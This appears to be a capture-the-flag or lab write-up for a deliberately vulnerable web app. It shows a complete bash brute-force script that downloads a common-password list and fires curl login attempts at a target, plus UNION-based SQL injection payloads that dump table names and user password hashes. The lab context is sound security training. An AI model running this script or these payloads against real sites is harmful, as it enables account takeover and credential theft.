# Brute force credentials

This vulnerability could be exploited without brute force attack (using SQL-injection).

## First option (Brute force)

Trying to sign in on the `http://$IPADDR/?page=signin` shows up the login and password pair in the link.
This means that the app uses `GET` method to send credentials, that must not happen.

To brute force, the script downloads the 1000 the most weak passwords and trying to sign in using them.

<details>
    <summary>Shell script that does the trick</summary>

```bash
#!/bin/bash

USER_FILE=users.txt
PSWD_FILE=passwords.txt
AMOUNT=1000

wget -q "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/xato-net-10-million-passwords-$AMOUNT.txt" --output-document $PSWD_FILE

HEADER='=================================================================\n'

printf $HEADER;
printf "%-16s\t| %-16s\t| %-8s\t|\n" "user" "pass" "match";
printf $HEADER;

while IFS= read -r user
do
    while IFS= read -r pass
    do
        curl -s "http://$IPADDR/?page=signin&username=$user&password=$pass&Login=Login" | grep -o 'flag' &>/dev/null
        
        if [ $? -eq 0 ]; then
            printf "%-16s\t| %-16s\t| %-8c\t|\n" $user $pass 'o';
            if [ ! "$2" = "--all" ]; then
                printf $HEADER;
                exit 0;
            fi
        else
            printf "%-16s\t| %-16s\t| %-8c\t|\n" $user $pass 'x';
        fi
    done < $PSWD_FILE
done < $USER_FILE

printf $HEADER;
```

</details>


## Second option (SQL injection)

To exploit, go to the `http://addr/index.php?page=member` and write the following commands at the search field:

List all the tables and related databases:
```
1 union select table_name, table_schema from information_schema.tables
```

List all table columns and related table names:
```
1 union select column_name, table_name from information_schema.columns
```

List all users with encrypted passwords:
```
1 union select username, password from Member_Brute_Force.db_default
```

## References
- [Brute Force Attack — OWASP](https://owasp.org/www-community/attacks/Brute_force_attack)
- [Testing Weak Passoword Policy — OWASP](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Password_Policy)
- [CWE-521: Weak Password Requirements](https://cwe.mitre.org/data/definitions/521.html)
- [Credential Stuffing Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html)
- [Information_schema](https://dev.mysql.com/doc/refman/8.0/en/information-schema-general-table-reference.html) structure